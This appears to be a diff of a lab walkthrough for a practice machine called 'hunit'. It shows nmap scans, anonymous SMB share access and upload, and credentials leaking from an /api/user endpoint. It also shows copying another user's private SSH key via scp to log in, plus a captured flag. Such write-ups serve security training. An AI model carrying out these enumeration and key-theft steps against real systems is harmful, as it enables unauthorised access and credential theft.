@@ -23,6 +23,9 @@ PORT      STATE SERVICE
 43022/tcp open  unknown
 
 Nmap done: 1 IP address (1 host up) scanned in 43.85 seconds
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ nmap $IP -sC -sV -p 8080,12445,18030,43022       
 Starting Nmap 7.95 ( <https://nmap.org> ) at 2026-01-21 02:06 UTC
@@ -46,6 +49,9 @@ PORT      STATE SERVICE     VERSION
 
 Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
 Nmap done: 1 IP address (1 host up) scanned in 61.15 seconds
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ nmap $IP -sU --top-ports 10               
 Starting Nmap 7.95 ( <https://nmap.org> ) at 2026-01-21 02:07 UTC
@@ -85,12 +91,15 @@ Anonymous login successful
 Reconnecting with SMB1 for workgroup listing.
 do_connect: Connection to 192.168.159.125 failed (Error NT_STATUS_IO_TIMEOUT)
 Unable to connect with SMB1 -- no workgroup available
-┌──(kali㉿kali)-[~/Desktop]                                                                                                              
+```
+
+```bash
+┌──(kali㉿kali)-[~/Desktop]                                        
 └─$ smbclient //$IP/Commander -p 12445                                                                                                   
-Password for [WORKGROUP\\kali]:                                                                                                           
-Anonymous login successful                                                                                                               
-Try "help" to get a list of possible commands.                                                                                           
-smb: \\> dir                                                                                                                              
+Password for [WORKGROUP\\kali]:                                        
+Anonymous login successful            
+Try "help" to get a list of possible commands.                   
+smb: \\> dir                                    
   .                                   D        0  Fri Nov  6 18:11:27 2020
   ..                                  D        0  Fri Jan 15 17:58:49 2021
   25_tailrec_function.kt              N      479  Fri Nov  6 18:11:16 2020
@@ -128,10 +137,12 @@ smb: \\> dir
   10_default_functions.kt             N      226  Fri Nov  6 18:11:16 2020
 ```
 
+
+
 I am able to upload to the share.
 
 ```bash
-smb: \\> put cat.jpg                                                                                                                      
+smb: \\> put cat.jpg                     
 putting file cat.jpg as \\cat.jpg (102.9 kb/s) (average 102.9 kb/s)
 ```
 
@@ -302,6 +313,9 @@ I found a few credentials in `/api/article` and `/api/user`
     "id": 2
   }
 ]   
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ curl -L <http://$IP:8080/api/user/> | jq   
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -380,6 +394,9 @@ Found `local.txt`
 ```bash
 dademola@hunit ~]$ ls
 blog.jar  local.txt  shared
+```
+
+```bash
 [dademola@hunit ~]$ cat local.txt
 e9c523042bb9e0815e56be225fd795f2
 ```
@@ -440,6 +457,9 @@ Transferred the private key to my local Kali and I successfully authenticated to
 └─$ scp -P 43022 dademola@$IP:/home/git/.ssh/id_rsa .
 dademola@192.168.159.125's password: 
 id_rsa                                                                                            100% 2590    27.2KB/s   00:00
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ ssh -i id_rsa git@$IP -p 43022
 Last login: Wed Jan 21 03:44:48 2026 from 192.168.45.236
